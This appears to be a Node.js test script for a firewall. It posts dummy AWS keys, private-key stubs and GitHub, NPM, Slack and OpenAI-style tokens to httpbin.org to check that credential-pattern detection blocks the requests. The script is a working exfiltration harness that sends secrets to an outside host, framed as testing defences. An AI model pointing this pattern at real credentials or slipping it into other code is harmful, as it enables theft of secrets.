/**
 * CREDENTIAL EXFILTRATION APP - FOR TESTING FIREWALL
 * Tests credential pattern detection in network requests
 */

const http = require('http');
const https = require('https');

console.log(' CREDENTIAL EXFILTRATION APP - Testing Firewall Protection');
console.log('\n');

const results = {
  total: 0,
  blocked: 0,
  succeeded: 0
};

// Helper
function testExfiltration(name, data, callback) {
  results.total++;
  console.log(`\n[ATTACK ${results.total}] ${name}`);
  
  try {
    const postData = typeof data === 'string' ? data : JSON.stringify(data);
    
    const options = {
      hostname: 'httpbin.org',
      port: 443,
      path: '/post',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const req = https.request(options, (res) => {
      results.succeeded++;
      console.log(` SUCCESS - Credentials exfiltrated (FIREWALL FAILED!)`);
      if (callback) callback();
    });
    
    req.on('error', (e) => {
      results.blocked++;
      console.log(` BLOCKED - ${e.message}`);
      if (callback) callback();
    });
    
    req.write(postData);
    req.end();
  } catch (e) {
    results.blocked++;
    console.log(` BLOCKED - ${e.message}`);
    if (callback) callback();
  }
}

// Track completed tests
let completed = 0;
const totalTests = 10;

function onComplete() {
  completed++;
  if (completed >= totalTests) {
    setTimeout(showSummary, 500);
  }
}

// === AWS CREDENTIALS ===

testExfiltration(
  'AWS Access Key in request body',
  {
    aws_access_key_id: 'AKIAIOSFODNN7EXAMPLE',
    aws_secret_access_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
  },
  onComplete
);

testExfiltration(
  'AWS credentials in plain text',
  'aws_access_key_id=AKIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
  onComplete
);

// === PRIVATE KEYS ===

testExfiltration(
  'RSA Private Key',
  `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ys...
-----END RSA PRIVATE KEY-----`,
  onComplete
);

testExfiltration(
  'Generic Private Key',
  `-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...
-----END PRIVATE KEY-----`,
  onComplete
);

// === TOKENS ===

testExfiltration(
  'GitHub Token',
  {
    GITHUB_TOKEN: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz',
    repo: 'victim/repo'
  },
  onComplete
);

testExfiltration(
  'NPM Token',
  {
    NPM_TOKEN: 'npm_1234567890abcdefghijklmnopqrstuvwxyz',
    package: '@victim/package'
  },
  onComplete
);

testExfiltration(
  'Slack Token',
  {
    SLACK_TOKEN: 'xoxb-1234567890-abcdefghijklmnopqrstuvwxyz',
    channel: '#general'
  },
  onComplete
);

testExfiltration(
  'OpenAI API Key',
  {
    OPENAI_API_KEY: 'sk-proj-1234567890abcdefghijklmnopqrstuvwxyz',
    model: 'gpt-4'
  },
  onComplete
);

// === REAL AWS KEY FORMAT ===

testExfiltration(
  'Real AWS Key Format (AKIA prefix)',
  {
    credentials: {
      accessKeyId: 'AKIA1234567890ABCDEF',
      secretAccessKey: 'abcdefghijklmnopqrstuvwxyz1234567890ABCD'
    }
  },
  onComplete
);

// === SAFE DATA (Should succeed) ===

testExfiltration(
  'Safe data without credentials (should be ALLOWED)',
  {
    name: 'test',
    value: 'hello world',
    timestamp: new Date().toISOString()
  },
  onComplete
);

function showSummary() {
  console.log('\n');
  console.log('  TEST SUMMARY');
  console.log('');
  console.log(`Total Attacks: ${results.total}`);
  console.log(`Blocked: ${results.blocked} `);
  console.log(`Succeeded: ${results.succeeded} ${results.succeeded > 1 ? '  CREDENTIAL DETECTION NEEDS FIXES' : '(only safe data)'}`);
  console.log('\n');
  
  process.exit(0);
}
